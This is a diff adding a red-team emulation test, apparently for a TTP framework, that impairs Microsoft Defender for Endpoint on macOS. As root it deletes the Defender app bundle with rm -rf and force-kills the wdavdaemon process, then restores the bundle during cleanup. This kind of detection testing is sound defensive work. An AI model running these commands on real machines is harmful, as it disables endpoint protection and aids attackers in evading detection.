@@ -1,0 +1,41 @@
+---
+api_version: 2.0
+uuid: b983354d-2abc-4759-8932-4ee230aa9480
+name: Disable MDE Second Test
+authors:
+  - cedowens
+description: |
+  This TTP simply deletes the /Applications/Microsoft Defender.app directory, which will stop MDE during the next reboot.
+args:
+  - name: sleepval
+mitre:
+  tactics:
+    - TA0005 Defense Evasion
+  techniques:
+    - T1562 Impair Defenses
+  subtechniques:
+    - T1562.001 Disable or Modify Tools
+steps:
+  - name: removedir
+    inline: |
+      if [ $(whoami) == "root" ]; then
+        echo -e "Making a copy of /Applications/Microsoft Defender.app, removing the original directory, and killing the currently running MDE process..."
+        cp -r /Applications/Microsoft\ Defender.app .
+        rm -rf /Applications/Microsoft\ Defender.app
+        mdeproc=$(ps -ef | grep "wdavdaemon privileged" |  grep -v color | awk '{print $2}') && kill -9 $mdeproc
+        touch canaryfile.txt
+      else
+        echo "This TTP must be run with root to successfully execute."
+      fi
+    cleanup:
+      inline: |
+        if [ -f canaryfile.txt ]; then
+           echo "Sleeping for {{ .Args.sleepval }} seconds and then restoring the /Applications/Microsoft Defender.app directory..."
+           sleep {{ .Args.sleepval }}
+           cp -r Microsoft\ Defender.app /Applications/
+           rm -rf Microsoft\ Defender.app
+           rm canaryfile.txt
+           echo "Cleanup Finished! MDE bundle restored!"
+        else
+           echo "Exiting, as this TTP was not run with sudo rights..."
+        fi
